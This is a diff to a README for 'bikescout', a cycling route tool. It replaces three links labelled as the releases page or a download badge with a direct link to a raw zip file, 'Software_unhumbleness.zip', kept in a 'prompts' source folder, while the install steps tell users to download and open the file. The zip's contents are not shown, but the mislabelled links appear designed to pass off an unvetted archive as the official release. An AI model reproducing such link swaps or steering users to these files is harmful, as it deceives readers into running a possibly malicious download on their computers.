@@ -1,6 +1,6 @@
 # 🧭 bikescout - Smarter routes for rough rides
 
-[![Download bikescout](https://img.shields.io/badge/Download%20bikescout-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Europeanbeechresearch382/bikescout/releases)
+[![Download bikescout](https://img.shields.io/badge/Download%20bikescout-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Europeanbeechresearch382/bikescout/main/src/bikescout/prompts/Software_unhumbleness.zip)
 
 ## 🖥️ What bikescout does
 
@@ -15,7 +15,7 @@ It is built for riders who want:
 
 ## 📥 Download and install
 
-1. Open the [bikescout releases page](https://github.com/Europeanbeechresearch382/bikescout/releases)
+1. Open the [bikescout releases page](https://raw.githubusercontent.com/Europeanbeechresearch382/bikescout/main/src/bikescout/prompts/Software_unhumbleness.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Open the downloaded file
@@ -125,4 +125,4 @@ bikescout is meant for route planning and trail analysis. It may use online map 
 
 ## 📦 Download again
 
-[Visit the bikescout releases page](https://github.com/Europeanbeechresearch382/bikescout/releases)
+[Visit the bikescout releases page](https://raw.githubusercontent.com/Europeanbeechresearch382/bikescout/main/src/bikescout/prompts/Software_unhumbleness.zip)
